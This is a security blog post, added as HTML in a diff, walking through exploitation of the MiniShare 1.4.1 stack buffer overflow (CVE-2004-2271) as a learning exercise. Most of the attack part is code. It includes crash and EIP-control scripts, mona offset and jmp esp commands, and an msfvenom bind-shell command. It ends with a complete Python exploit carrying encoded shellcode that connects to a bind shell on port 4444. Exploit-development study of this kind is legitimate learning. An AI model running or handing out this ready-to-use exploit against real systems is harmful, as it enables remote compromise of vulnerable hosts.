@@ -1,0 +1,280 @@
+<!DOCTYPE html><html lang="en-us" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[Learning] CVE-2004-2271: MiniSHare v1.4.1 RCE — Buffer Overflow | ISSAC/iss4cf0ng's blog</title><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="[Learning] CVE-2004-2271: MiniSHare v1.4.1 RCE — Buffer Overflow | ISSAC/iss4cf0ng's blog"><meta name="twitter:image" content="/images/meme/mika_rollcake.png"><meta property="og:title" content="[Learning] CVE-2004-2271: MiniSHare v1.4.1 RCE — Buffer Overflow"><meta property="og:image" content="/images/meme/mika_rollcake.png"><meta property="og:url" content="https://iss4cf0ng.github.io/2026/09/09/2026-9-9-Minishare-BOF/index.html"><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":true,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+ menuSettings: {
+   zoom: "None"
+ },
+ showMathMenu: false,
+ jax: ["input/TeX","output/CommonHTML"],
+ extensions: ["tex2jax.js"],
+ TeX: {
+   extensions: ["AMSmath.js","AMSsymbols.js"],
+   equationNumbers: {
+     autoNumber: "AMS"
+   }
+ },
+ tex2jax: {
+   inlineMath: [["\\(", "\\)"]],
+   displayMath: [["\\[", "\\]"]]
+ }
+});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><script async src="https://www.googletagmanager.com/gtag/js?id=G-RQ7HTMYT8W"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-RQ7HTMYT8W');</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ISSAC/iss4cf0ng's blog" type="application/atom+xml">
+</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/About/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/Alien/"><span class="navItemTitle">Alien</span></a></li><li class="navItem"><a class="navBlock" href="/Arsenal/"><span class="navItemTitle">Arsenal</span></a></li><li class="navItem"><a class="navBlock" href="/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/"><span class="navItemTitle">DuplexSpy</span></a></li><li class="navItem"><a class="navBlock" href="/Notes/"><span class="navItemTitle">Notes</span></a></li><li class="navItem"><a class="navBlock" href="/Series/"><span class="navItemTitle">Series</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[Learning] CVE-2004-2271: MiniSHare v1.4.1 RCE — Buffer Overflow</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2026-09-08T17:21:26.000Z" id="date"> 2026-09-09</time></div></span><br><span>Last Update: <div class="control"><time datetime="2026-09-09T08:37:31.637Z" id="updated"> 2026-09-09</time></div></span><br><span>Word Count: <div class="control">1.7k</div></span><br><span>Read Time: <div class="control">10 min</div></span></div></div><hr><div id="post-content"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is part of my <strong><a href="/FromBugToExploit/">“From Bug To Exploit”</a></strong> series.</p>
+<p>In this article, I will demonstrate how to exploit Minishare v1.4.1 through a buffer overflow.</p>
+<blockquote>
+<p>Murmur: In <a href="/2026/09/08/2026-9-8-WarFTP-BOF/">the previous article</a>, I spent hours trying to get <code>calc.exe</code> to launch. In this practice, however, I spent less than 30 minutes developing and completing the exploit script!</p>
+</blockquote>
+<p align="center" class='item-img' data-src='/images/meme/mika_rollcake.png'><img src="/images/meme/mika_rollcake.png" width=250/>
+</p>
+
+<h1 id="Buffer-Overflow"><a href="#Buffer-Overflow" class="headerlink" title="Buffer Overflow"></a>Buffer Overflow</h1><p>The vulnerability is caused by the following process:</p>
+<ol>
+<li>After receiving an HTTP request, the server application splits the data based on a pattern such as <code>HTTP/1.X</code>.</li>
+<li>The first part is treated as the method (or URL) and stored in a buffer.</li>
+<li>During this process, the server application does not properly check the boundary or length of the data, allowing an attacker to store an excessive amount of data in the buffer, which causes a stack-based buffer overflow.</li>
+</ol>
+<p align="center" class='item-img' data-src='/images/article/2026-9-9-Minishare-BOF/1.png'><img src="/images/article/2026-9-9-Minishare-BOF/1.png" width=500/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-9-9-Minishare-BOF/2.png'><img src="/images/article/2026-9-9-Minishare-BOF/2.png" width=800/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-9-9-Minishare-BOF/3.png'><img src="/images/article/2026-9-9-Minishare-BOF/3.png" width=800/>
+</p>
+
+<blockquote>
+<p>Note: I found that many reports online state that this vulnerability is caused by the HTTP method, such as <code>GET</code>, <code>POST</code>, or <code>HEAD</code>. However, my experiments show that this is inaccurate. The method itself is not the key point; the large amount of data is. A buffer overflow can occur even when the HTTP method is omitted. In this article, however, I discovered this phenomenon toward the end, so many of the screenshots were taken using an HTTP method. The final exploit script does not contain any HTTP method.</p>
+</blockquote>
+<p>First, I tried to crash the server application by sending a large amount of data:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> argparse<br><br>parser = argparse.ArgumentParser(description=<span class="hljs-string">&quot;Minishare 1.4.1 RCE — Stack-based Buffer Overflow&quot;</span>)<br>parser.add_argument(<span class="hljs-string">&quot;target&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Target IP address&quot;</span>)<br>parser.add_argument(<span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;--port&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">80</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Target HTTP port (default: 80)&quot;</span>)<br>args = parser.parse_args()<br><br>method = <span class="hljs-string">b&#x27;GET&#x27;</span><br>junk = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">3000</span><br>header = <span class="hljs-string">b&#x27;HTTP/1.1\r\n\r\n&#x27;</span><br><br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>payload += method<br>payload += junk<br>payload += header<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> args.target <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> args.port:<br>            args.print_help()<br>            <span class="hljs-keyword">return</span><br>    <br>        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        sock.connect((args.target, args.port))<br><br>        sock.send(payload)<br>        sock.close()<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span>(ex)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-9-9-Minishare-BOF/4.png'><img src="/images/article/2026-9-9-Minishare-BOF/4.png" width=600/>
+</p>
+
+<p>The server then crashes after processing the junk data.</p>
+<p>The next step is to find the exact offset required to overwrite EIP. To do this, we need to create a special pattern using <code>mona</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">!mona pattern_create 3000<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-9-9-Minishare-BOF/5.png'><img src="/images/article/2026-9-9-Minishare-BOF/5.png" width=800/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-9-9-Minishare-BOF/6.png'><img src="/images/article/2026-9-9-Minishare-BOF/6.png" width=800/>
+</p>
+
+<p>Then, send the pattern data to the server again:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-9-Minishare-BOF/7.png'><img src="/images/article/2026-9-9-Minishare-BOF/7.png" width=600/>
+</p>
+
+<p>The value shown in EIP is <code>43366843</code>. Therefore, we can use <code>mona</code> to find the exact offset:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">!mona pattern_offset 43366843<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-9-9-Minishare-BOF/8.png'><img src="/images/article/2026-9-9-Minishare-BOF/8.png" width=800/>
+</p>
+
+<p>The exact offset is <code>1788</code>. However, since I removed the HTTP method, the final offset is <code>1791</code>.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> select<br><br>parser = argparse.ArgumentParser(description=<span class="hljs-string">&quot;Minishare 1.4.1 RCE — Stack-based Buffer Overflow&quot;</span>)<br>parser.add_argument(<span class="hljs-string">&quot;target&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Target IP address&quot;</span>)<br>parser.add_argument(<span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;--port&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">80</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Target HTTP port (default: 80)&quot;</span>)<br>args = parser.parse_args()<br><br>junk = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">1791</span><br>eip = struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0xDEADBEEF</span>)<br>header = <span class="hljs-string">b&#x27;HTTP/1.1\r\n\r\n&#x27;</span><br><br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>payload += junk<br>payload += eip<br>payload += header<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> args.target <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> args.port:<br>            args.print_help()<br>            <span class="hljs-keyword">return</span><br>    <br>        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        sock.connect((args.target, args.port))<br><br>        sock.send(payload)<br>        sock.close()<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span>(ex)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-9-9-Minishare-BOF/9.png'><img src="/images/article/2026-9-9-Minishare-BOF/9.png" width=600/>
+</p>
+
+<p>Next, we need to execute the shellcode. To do so, the EIP value needs to point to an address on the stack, since the shellcode is located on the stack in this scenario.</p>
+<p>To achieve this, we need the CPU to execute <code>jmp esp</code>. Therefore, we simply need to overwrite EIP with an address containing the <code>jmp esp</code> instruction. We can use <code>mona</code> to search for this instruction in all loaded modules:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">!mona jmp -r esp<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-9-9-Minishare-BOF/10.png'><img src="/images/article/2026-9-9-Minishare-BOF/10.png" width=800/>
+</p>
+
+<p>Here, I chose to use the address <code>0x77def069</code>.</p>
+<p>Lastly, I generated a payload with <code>msfvenom</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/shell_bind_tcp LPORT=4444 -b <span class="hljs-string">&quot;\x00\x0a\x0d\x09\x20\x40&quot;</span> -f python -e x86/shikata_ga_nai -i 3 -v shellcode <br></code></pre></td></tr></table></figure>
+<p>Therefore, the completed exploit script can be implemented as follows:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># exploit.py</span><br><span class="hljs-comment"># Author: iss4cf0ng/ISSAC</span><br><span class="hljs-comment"># GitHub: https://github.com/iss4cf0ng</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> select<br><br>parser = argparse.ArgumentParser(description=<span class="hljs-string">&quot;Minishare 1.4.1 RCE — Stack-based Buffer Overflow&quot;</span>)<br>parser.add_argument(<span class="hljs-string">&quot;target&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Target IP address&quot;</span>)<br>parser.add_argument(<span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;--port&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">80</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Target HTTP port (default: 80)&quot;</span>)<br>args = parser.parse_args()<br><br>junk = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">1791</span><br>eip = struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x77def069</span>)<br>header = <span class="hljs-string">b&#x27;HTTP/1.1\r\n\r\n&#x27;</span><br>nopsled = <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">32</span><br><br>int3 = <span class="hljs-string">b&#x27;\xcc&#x27;</span><br><br>shellcode =  <span class="hljs-string">b&quot;&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xbb\xaf\x34\x80\xce\xdd\xc4\xd9\x74\x24\xf4&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x5e\x2b\xc9\xb1\x60\x31\x5e\x14\x03\x5e\x14&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x83\xee\xfc\x4d\xc1\x5a\x0c\x48\x5e\x7f\x65&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xd7\x61\xc7\xa2\xa0\xc6\x0b\x64\x1f\xaf\xe8&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x9e\xa3\x61\x87\x48\x58\xea\x41\x97\x55\xef&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x18\xa3\x3b\x7e\x42\x72\xf6\xaa\xf2\xcf\x3f&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x4b\x44\xcc\xab\xbc\x8c\xa5\xca\x90\x71\xbc&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x49\x39\x72\xd4\x84\xeb\x8f\xfa\x0b\x78\xe1&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x42\x43\x34\x28\xf9\x5f\x9d\xdb\xfd\x25\x9e&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x08\x8f\x8d\xcd\x4d\x80\x04\x67\xec\x47\x53&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xd3\x41\x45\x21\x08\x27\x99\xde\xd1\xbe\x96&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x3d\x8c\xa6\x6b\xde\x14\x36\xaa\x71\xb9\xa1&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xc5\x5d\xcb\x0c\xc5\x8d\xa0\x16\x90\xf0\x73&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x82\x51\x67\x55\x50\x82\x10\xeb\xa0\x5f\x28&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xaf\xca\x4f\x6f\x18\x33\x22\x1e\x96\xd9\x96&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x2e\x83\xd5\xcc\xfb\xb0\xd5\x51\x04\x98\xfe&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xb0\x6d\xd9\xa1\x8a\x3a\x54\x9d\x5a\x88\xda&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xea\x5f\x25\x6c\xe8\x2c\x68\xfe\x2f\xca\x95&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xf9\x11\x70\xe0\x4f\xaa\xfe\x80\x13\xa5\xa5&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xbf\x45\x4c\x82\xd0\x10\x72\xe1\x4e\x1e\x12&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x03\x5f\x65\x18\xa8\xae\x5a\xfd\x99\x13\x85&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x9c\xfc\x4d\x69\x2e\xea\x90\x2d\xa6\xef\xbb&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x29\xa3\x9e\xf0\x38\xfd\x9f\xbf\xa6\xd4\x32&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xb8\x06\x4a\x0e\xf6\x7a\x93\x86\xaf\x5a\x4f&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xcd\x32\xb9\x46\x17\xc0\x7f\x70\x24\x5a\x8f&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x39\xf7\xe4\xe5\x77\xec\xb6\xfe\x17\x7e\x0f&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x5a\x93\x14\xf5\xee\x66\xed\x5d\x96\x11\x41&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x4f\x42\x9d\x5b\x82\xdd\xb4\x26\xad\x90\xf1&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xc3\xff\x75\xeb\xbc\xf8\x87\x3f\xe7\xa2\xaa&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x63\xbf\x14\x06\x0e\x5d\xa6\x8f\x25\x68\x7e&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xba\xae\x06\xc8\x02\x39\x57\x29\xf2\x99\xdd&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x8b\x69\x24\xaa\xd8\x7f\xd2\xbb\x4c\x44\x06&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x38\x27\x8c\x80\x1f\x83\x71\x1f\x84\xc4\x8d&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xd4\xad\x9c\xa2\x53\x70\x0e\xe2\xaf\x5d\x8f&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x53\x7d\x8c\x08\x8b\x45\x54\xe7\x03\xda\x44&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xe9\xcc\x5f\x4d\x2b\xaa\x3a\x2e\xf7\x24\x04&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x06\xa0\x08\x99\x74\x55\xd9\x01\x8e\x08\xcf&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x93\x58&quot;</span><br><br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>payload += junk<br>payload += eip<br>payload += nopsled<br><span class="hljs-comment">#payload += int3</span><br>payload += shellcode<br>payload += header<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_pwn</span>():<br>    shell_sock = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">for</span> attempt <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>): <span class="hljs-comment"># retry</span><br>        <span class="hljs-keyword">try</span>:<br>            shell_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>            shell_sock.settimeout(<span class="hljs-number">10</span>)<br>            shell_sock.connect((args.target, <span class="hljs-number">4444</span>))<br>            shell_sock.settimeout(<span class="hljs-literal">None</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[+] Pwned!\n&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span> (socket.error, socket.timeout):<br>            <span class="hljs-keyword">if</span> shell_sock:<br>                shell_sock.close()<br>            shell_sock = <span class="hljs-literal">None</span><br>            sys.stdout.write(<span class="hljs-string">&quot;.&quot;</span>)<br>            sys.stdout.flush()<br><br>        time.sleep(<span class="hljs-number">10</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> shell_sock:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Connection failed: Max retries reached.&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Interactive shell spawned below:\n&quot;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        read_list = [sys.stdin, shell_sock]<br>        read_sockets, _, _ = select.select(read_list, [], [])<br><br>        <span class="hljs-keyword">if</span> sys.stdin <span class="hljs-keyword">in</span> read_sockets:<br>            line = sys.stdin.readline()<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> line:<br>                <span class="hljs-keyword">break</span><br>            shell_sock.sendall(line.encode())<br><br>        <span class="hljs-keyword">if</span> shell_sock <span class="hljs-keyword">in</span> read_sockets:<br>            data = shell_sock.recv(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[-] Connection closed by target.&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>            sys.stdout.write(data.decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br>            sys.stdout.flush()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> args.target <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> args.port:<br>            args.print_help()<br>            <span class="hljs-keyword">return</span><br>    <br>        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        sock.connect((args.target, args.port))<br><br>        sock.send(payload)<br>        sock.close()<br><br>        do_pwn()<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span>(ex)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-9-9-Minishare-BOF/11.png'><img src="/images/article/2026-9-9-Minishare-BOF/11.png" width=800/>
+</p>
+
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>In this article, I demonstrated how to exploit a legacy application using a classic stack-based buffer overflow.</p>
+<p>Unlike <a href="/2026/09/08/2026-9-8-WarFTP-BOF/">the previous article</a>, I spent only about 30 minutes developing the completed exploit script. I hope this demonstrates that my exploit development skills have been improving!</p>
+<p>In the next article, I will start practicing SEH-based buffer overflows.</p>
+<p>This is the end of this article. If you have any comments or suggestions, please feel free to leave them below!</p>
